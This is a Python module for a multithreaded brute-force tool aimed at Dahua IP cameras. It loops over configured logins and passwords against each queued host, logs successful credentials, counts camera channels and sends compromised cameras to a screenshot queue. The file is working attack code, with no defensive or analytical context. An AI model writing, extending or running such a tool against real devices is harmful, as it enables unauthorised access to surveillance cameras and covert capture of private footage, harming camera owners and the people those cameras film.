import logging
import threading

import config
from dahua import DahuaController


class BruteThread(threading.Thread):
    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue

    def run(self):
        while True:
            with threading.Lock():
                host = self.brute_queue.get()
            self.dahua_auth(host)
            self.brute_queue.task_done()

    def dahua_login(self, server_ip, port, login, password):
        with threading.Lock():
            config.update_status()
            logging.debug(f'Login attempt: {server_ip} with {login}:{password}')
        dahua = DahuaController(server_ip, port, login, password)
        if dahua.status == 0:
            logging.debug(f'Success login: {server_ip} with {login}:{password}')
            return dahua
        elif dahua.status == 2:
            logging.debug(f'Blocked camera: {server_ip}:{port}')
            return "Blocked"
        else:
            logging.debug(f'Unable to login: {server_ip}:{port} with {login}:{password}')
            return None

    def dahua_auth(self, host):
        server_ip = host[0]
        port = int(host[1])
        for login in config.logins:
            for password in config.passwords:
                try:
                    res = self.dahua_login(server_ip, port, login, password)
                    if res == "Blocked" or res is None:
                        break
                    config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
                    config.ch_count += res.channels_count
                    self.screenshot_queue.put(res)
                    return
                except Exception as e:
                    logging.debug(f'Connection error: {server_ip}:{port} - {str(e)}')
